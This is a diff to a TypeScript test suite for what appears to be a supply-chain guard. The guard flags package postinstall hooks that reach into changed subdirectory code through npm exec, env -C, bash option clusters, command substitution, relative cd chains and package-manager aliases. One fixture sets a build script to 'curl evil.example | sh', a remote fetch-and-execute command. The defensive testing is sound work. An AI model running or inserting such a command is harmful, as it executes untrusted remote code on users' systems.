@@ -267,7 +267,6 @@ describe("fifth review round: false positives and the npm exec parser", () => {
     const withIndex = (build: string) => ({ ...subManifest(build), "sub/index.js": "1" });
     const h = (hook: string) => held({ postinstall: hook, build: "echo ok" }, withIndex("echo a"), withIndex("curl evil.example | sh"));
     for (const cmd of ["npm exec -y -c 'cd sub && npm run build'", "npm exec --yes --call='pnpm -C sub build'", "npm exec -p pnpm -- pnpm -C sub build"]) expect(h(cmd), cmd).toBe(true);
-    // The package option is read as remote, not as an unknown flag that widens the stay-in-place forms.
     expect(h("npm exec -c 'node ./x.js'")).toBe(false);
   });
 });
@@ -415,5 +414,35 @@ describe("unsplit bodies: runners, moved directories, escapes and comments", () 
     }
     // A comment is not a command.
     expect(idx("node a.js > /dev/null # cd sub && npm run build", { "a.js": "1" })).toBe(false);
+  });
+});
+
+describe("joined env directory flags, clustered shell options, substitutions, relative cd and aliases", () => {
+  const dirHeld = (cmd: string, dir: string, files: Record<string, string> = {}) => held({ postinstall: cmd }, { [`${dir}/setup.js`]: "1", [`${dir}/gen.js`]: "1", ...files }, { [`${dir}/setup.js`]: "evil()", [`${dir}/gen.js`]: "evil()", ...files });
+
+  test("env -Cdir and --chdir=dir record the directory", () => {
+    expect(dirHeld("env -Ctest node setup.js", "test")).toBe(true);
+    expect(dirHeld("env --chdir=test node setup.js", "test")).toBe(true);
+    expect(dirHeld("env -C test node setup.js", "test")).toBe(true);
+  });
+
+  test("a cluster ending in o takes its option name before the string", () => {
+    expect(dirHeld("bash -eco pipefail 'cd test && node setup.js'", "test")).toBe(true);
+  });
+
+  test("a command substitution inside quotes runs its content", () => {
+    expect(dirHeld('echo "$(cd test && node setup.js)"', "test")).toBe(true);
+    expect(dirHeld('echo "`cd test && node setup.js`"', "test")).toBe(true);
+  });
+
+  test("a relative cd chain resolves against the earlier cd", () => {
+    expect(dirHeld("cd tools > /dev/null && cd ../docs > /dev/null && node gen.js", "docs", { "tools/x": "1" })).toBe(true);
+    expect(dirHeld("cd tools && cd ../docs && node gen.js", "docs", { "tools/x": "1" })).toBe(true);
+  });
+
+  test("yarnpkg and pnpx are yarn and npx", () => {
+    const m = (cmd: string) => manifestHeld(cmd);
+    expect(m("yarnpkg --cwd sub build")).toBe(true);
+    expect(m("pnpx pnpm -C sub build")).toBe(true);
   });
 });
